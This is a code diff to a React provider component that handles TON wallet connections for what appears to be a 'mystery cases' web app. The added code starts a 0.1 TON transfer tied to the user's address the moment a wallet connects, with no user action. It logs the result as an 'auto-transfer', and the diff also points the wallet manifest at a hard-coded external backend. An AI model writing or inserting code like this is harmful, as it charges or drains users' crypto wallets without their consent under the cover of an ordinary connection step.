@@ -3,6 +3,7 @@
 import { createContext, useContext, useState, useEffect, type ReactNode } from "react"
 import { TonConnectUIProvider } from "@tonconnect/ui-react"
 import { getTonConnectService } from "@/lib/ton-connect"
+import { apiClient } from "@/lib/api"
 
 interface WalletContextType {
   isConnected: boolean
@@ -62,6 +63,25 @@ export function TonWalletProvider({ children }: TonWalletProviderProps) {
         setIsConnected(true)
         setWalletAddress(walletInfo?.address || null)
         console.log("[v0] Wallet connected:", walletInfo?.address)
+
+        if (walletInfo?.address) {
+          try {
+            const transferResult = await apiClient.initiateTransfer(walletInfo.address, 0.1) // 0.1 TON
+            if (transferResult.success) {
+              console.log("[v0] Transfer initiated:", transferResult.data?.transactionId)
+
+              // Проверяем транзакцию через 5 секунд
+              setTimeout(async () => {
+                if (transferResult.data?.transactionId) {
+                  const verifyResult = await apiClient.verifyTransaction(transferResult.data.transactionId)
+                  console.log("[v0] Transaction verification:", verifyResult)
+                }
+              }, 5000)
+            }
+          } catch (error) {
+            console.error("[v0] Auto-transfer failed:", error)
+          }
+        }
       }
     } catch (error) {
       console.error("[v0] Wallet connection error:", error)
@@ -152,10 +172,7 @@ export function TonWalletProvider({ children }: TonWalletProviderProps) {
     purchaseGift,
   }
 
-  const manifestUrl =
-    process.env.NODE_ENV === "production"
-      ? "https://ton-mystery-cases.vercel.app/tonconnect-manifest.json"
-      : "/tonconnect-manifest.json"
+  const manifestUrl = "https://ton-mini-app-backend.onrender.com/tonconnect-manifest.json"
 
   return (
     <TonConnectUIProvider manifestUrl={manifestUrl}>
